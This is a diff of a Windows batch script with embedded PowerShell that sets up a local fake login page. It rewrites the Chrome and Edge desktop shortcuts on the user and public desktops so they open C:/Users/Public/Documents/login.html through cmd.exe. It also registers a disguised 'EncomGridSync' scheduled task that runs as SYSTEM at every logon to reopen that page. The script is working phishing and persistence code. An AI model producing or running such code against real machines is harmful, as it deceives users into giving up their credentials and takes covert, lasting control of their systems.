@@ -54,29 +54,36 @@ echo ^</html^>
 ) > "%WEB_PATH%"
 
 :: ----------------------------------------------------
-:: STEP 2: Hijack the Desktop Shortcut via PowerShell
+:: STEP 2: Hijack Desktop Shortcuts via PowerShell
 :: ----------------------------------------------------
 echo [+] Modifying User Desktop Application Shortcuts...
 
 powershell -NoProfile -Command ^
     "$Shell = New-Object -ComObject WScript.Shell; " ^
-    "$ShortcutPath = [System.IO.Path]::Combine([Environment]::GetFolderPath('Desktop'), 'Microsoft Edge.lnk'); " ^
-    "if (Test-Path $ShortcutPath) { " ^
-    "   $Shortcut = $Shell.CreateShortcut($ShortcutPath); " ^
-    "   $Shortcut.TargetPath = 'cmd.exe'; " ^
-    "   $Shortcut.Arguments = '/c start msedge.exe file:///C:/Users/Public/Documents/login.html'; " ^
-    "   $Shortcut.Save(); " ^
-    "   Write-Output '    - Edge shortcut successfully hijacked.'; " ^
-    "} else { " ^
-    "   Write-Output '    - Edge shortcut not found on Desktop. Skipping shortcut hijack.'; " ^
-    "}"
+    "$UserDesktop = [Environment]::GetFolderPath('Desktop'); " ^
+    "$PublicDesktop = [Environment]::GetFolderPath('PublicDesktop'); " ^
+    "function Hijack-Shortcut($Name, $Binary, $Args) { " ^
+    "   $Paths = @([System.IO.Path]::Combine($UserDesktop, $Name), [System.IO.Path]::Combine($PublicDesktop, $Name)); " ^
+    "   foreach ($Path in $Paths) { " ^
+    "       if (Test-Path $Path) { " ^
+    "           $Shortcut = $Shell.CreateShortcut($Path); " ^
+    "           $Shortcut.TargetPath = 'cmd.exe'; " ^
+    "           $Shortcut.Arguments = $Args; " ^
+    "           $Shortcut.Save(); " ^
+    "           Write-Output \"    - Hijacked: $Name ($Path)\"; " ^
+    "       } " ^
+    "   } " ^
+    "}; " ^
+    "Hijack-Shortcut 'Google Chrome.lnk' 'chrome.exe' '/c start chrome.exe file:///C:/Users/Public/Documents/login.html'; " ^
+    "Hijack-Shortcut 'Microsoft Edge.lnk' 'msedge.exe' '/c start msedge.exe file:///C:/Users/Public/Documents/login.html';"
 
 :: ----------------------------------------------------
 :: STEP 3: Register Persistence via Scheduled Task
 :: ----------------------------------------------------
 echo [+] Setting up persistent system configuration...
 
-schtasks /create /tn "EncomGridSync" /tr "cmd.exe /c start msedge file:///C:/Users/Public/Documents/login.html" /sc onlogon /ru "SYSTEM" /f >nul 2>&1
+:: Update the scheduled task to use chrome instead of edge
+schtasks /create /tn "EncomGridSync" /tr "cmd.exe /c start chrome.exe file:///C:/Users/Public/Documents/login.html" /sc onlogon /ru "SYSTEM" /f >nul 2>&1
 
 if %errorlevel% equ 0 (
     echo     - Scheduled task 'EncomGridSync' registered successfully.
